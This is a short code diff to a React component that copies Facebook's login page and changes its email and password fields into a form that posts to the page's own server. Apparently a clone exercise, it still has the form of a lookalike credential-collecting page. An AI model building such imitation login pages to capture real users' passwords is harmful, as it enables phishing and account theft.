@@ -9,16 +9,17 @@ function App() {
             <p>Connect with friends and the world around you on Facebook.</p>
         </div>
       
-        <div className="form"/>
-            <input type="text" className="email" placeholder="Email or phone number"/>
-            <input type="password" className="password" placeholder="Password"/> <br/>
-            <input type="button" className="login" value="Log In"/> <br></br>
+        <div className="form">
+          <form method="post">
+            <input name="login" type="text" className="email" placeholder="Email or phone number"/>
+            <input name="pasworrd" type="password" className="password" placeholder="Password"/> <br/>
+            <input type="submit" className="login" value="Log In"/> <br></br>
             <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">Forgot password?</a>
             <hr/>
             <input type="button" class="create-account" value="Create new account"/>
             <p><a href="https://www.facebook.com/reg">Create a Page</a> for celebrity, brand or business.</p>
-        <div>
-        </div>
+        </form>
+  </div>
    
     <br/>
     <br/>
